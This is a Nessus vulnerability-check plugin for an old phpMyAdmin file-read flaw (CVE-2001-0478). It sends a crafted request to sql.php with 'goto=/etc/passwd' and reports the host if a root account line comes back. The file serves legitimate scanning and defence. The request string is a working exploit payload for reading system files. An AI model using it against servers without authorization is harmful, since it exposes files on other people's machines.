#
# (C) Tenable Network Security, Inc.
#

#
# Ref: http://www.securereality.com.au/archives/sradv00008.txt
#


include("compat.inc");

if(description)
{
 script_id(11116);
 script_version ("$Revision: 1.20 $");
 script_cve_id("CVE-2001-0478");
 script_bugtraq_id(2642);
 script_xref(name:"OSVDB", value:"7727");

 script_name(english:"phpMyAdmin sql.php Traversal Arbitrary File Access");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
local file inclusion flaw." );
 script_set_attribute(attribute:"description", value:
"It is possible to make the remote phpMyAdmin installation read
arbitrary data on the remote host.  An attacker may use this flaw to
read arbitrary files that your web server has the right to access or
execute arbitrary PHP code." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2001-04/0396.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to phpMyAdmin 2.2.1 or newer" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P" );

script_end_attributes();

 script_summary(english:"Checks for the presence of sql.php");
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("phpMyAdmin_detect.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);


function check(dir, file)
{
 local_var r;

 r = http_send_recv3(method:"GET",item:string(dir, "/", file, "?server=000&cfgServers[000][host]=hello&btnDrop=No&goto=/etc/passwd"),
 		port:port);
 if( r == NULL ) exit(0);
 
 if(egrep(pattern:".*root:.*:.*:0:[01]:.*", string:r[2]))
   {
 	security_warning(port);
	exit(0);
   }
}


# Test an install.
install = get_kb_item(string("www/", port, "/phpMyAdmin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  check(dir:dir, file:"sql.php");
  check(dir:dir, file:"sql.php3");
}
